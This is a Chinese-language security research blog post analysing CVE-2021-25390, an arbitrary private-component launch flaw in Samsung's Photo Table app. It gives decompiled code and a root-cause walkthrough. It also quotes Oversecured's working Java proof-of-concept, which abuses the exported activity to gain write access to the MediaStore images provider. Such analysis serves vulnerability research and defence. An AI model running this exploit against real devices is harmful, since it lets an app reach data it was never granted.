---
layout: post
title:  "[CVE-2021-25390] [Samsung] [Photo Table] 组件PermissionsRequestActivity存在任意私有组件启动漏洞可获取ContentProvider数据"
date:   2022-11-20 18:00:00 +520
categories: Android_Security
tags: [AndroidApplication, LogicBug, ExportedComponent]
---

|    Date    | Version |     Description      |   Author    |
| :--------: | :-----: | :------------------: | :---------: |
| 2022.11.20 |   1.0   | 完整的漏洞分析与利用 | wnagzihxa1n |

## 0x00 漏洞概述

三星手机系统的Photo Table存在一个导出组件`PermissionsRequestActivity`，其接收外部传入的字段`"previous_intent"`并直接打开，存在任意私有组件启动漏洞，结合FileProvider等配置可实现任意文件读写，由于Photo Table不存在FileProvider，所以只能获取到ContentProvider数据

## 0x01 触发条件

| 上线日期 |   应用名    |             包名              | 版本号 |               MD5                | 下载链接 |
| :------: | :---------: | :---------------------------: | :----: | :------------------------------: | :------: |
|          | Photo Table | com.android.dreams.phototable |        | 2fbd11fa7859d5a2c223b8439cd01f65 |          |

## 0x02 PoC

## 0x03 前置知识

## 0x04 Root Cause Analysis

组件`com.android.dreams.phototable.PermissionsRequestActivity`导出

```xml
<activity 
        android:configChanges="keyboard|keyboardHidden|orientation|screenSize|uiMode" 
        android:excludeFromRecents="true" 
        android:label="@string/app_name" 
        android:name="com.android.dreams.phototable.PermissionsRequestActivity" 
        android:theme="@style/Theme.Permission.Activity">
    <intent-filter>
    	<action android:name="android.intent.action.MAIN"/>
    </intent-filter>
</activity>
```

在方法`onCreate()`里，`[1]`获取外部传入Intent的字段`"previous_intent"`并保存到`__intent_bundle_mDreamPreviousIntent__`

```java
// com.android.dreams.phototable.PermissionsRequestActivity
@Override  // android.app.Activity
public void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    Bundle __intent_bundle__ = this.getIntent().getExtras();
    this.mExtras = __intent_bundle__;
    if(__intent_bundle__ == null) {
        this.finish();
        return;
    }

    this.__intent_bundle_mDreamPreviousIntent__ = (Intent)__intent_bundle__.get("previous_intent");  // [1] 
}
```

在方法`onResume()`里，`[1]`调用方法`startDreamActivity()`处理传入的`"previous_intent"`

```java
// com.android.dreams.phototable.PermissionsRequestActivity
@Override  // android.app.Activity
protected void onResume() {
    super.onResume();
    ArrayList arrayList = RuntimePermissionsUtils.getDisabledPermissionList(this, ((String[])this.mExtras.get("permission_list")));
    this.mRequestPermissionsList = arrayList;
    if(arrayList.size() > 0) {
        ...
    }

    if(!this.mIsAlreadyDreamStarted) {
        this.startDreamActivity();  // [1]
    }
}
```

调用方法`startActivity()`打开外部传入的`"previous_intent"`，此处存在任意私有组件启动漏洞

```java
private void startDreamActivity() {
    this.mIsAlreadyDreamStarted = true;
    if(!RuntimePermissionsUtils.isInLockTaskMode(this.getBaseContext())) {
        this.finish();
    }

    Intent __intent_bundle_DreamPreviousIntent__ = this.__intent_bundle_mDreamPreviousIntent__;
    if(__intent_bundle_DreamPreviousIntent__ != null) {
        __intent_bundle_DreamPreviousIntent__.addFlags(0x10000);
        this.startActivity(this.__intent_bundle_mDreamPreviousIntent__);  // [1]
    }

    this.overridePendingTransition(0, 0);
}
```

## 0x05 调试与利用

Oversecured实验室的PoC还是写的可以的，这种写法我一开始没有想到

```java
protected void onCreate(Bundle savedInstanceState) {
   super.onCreate(savedInstanceState);
   handle(getIntent());
}

protected void onNewIntent(Intent intent) {
   super.onNewIntent(intent);
   handle(intent);
}

private void handle(Intent intent) {
   if("evil".equals(intent.getAction())) {
       String uri = MediaStore.Images.Media.insertImage(getContentResolver(),
               Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888),
               "Title_1337",
               "Description_1337");
       Log.d("evil", "Result: " + uri);
   }
   else {
       Intent next = new Intent("evil", MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
       next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
       next.setClass(this, getClass());

       Intent i = new Intent();
       i.setClassName("com.android.dreams.phototable", "com.android.dreams.phototable.PermissionsRequestActivity");
       i.putExtra("previous_intent", next);
       i.putExtra("permission_list", new String[0]);
       startActivity(i);
   }
}
```

## 0x06 漏洞研究

## 0x07 References

《Two weeks of securing Samsung devices: Part 1》

- https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/

## 附录：调试过程记录

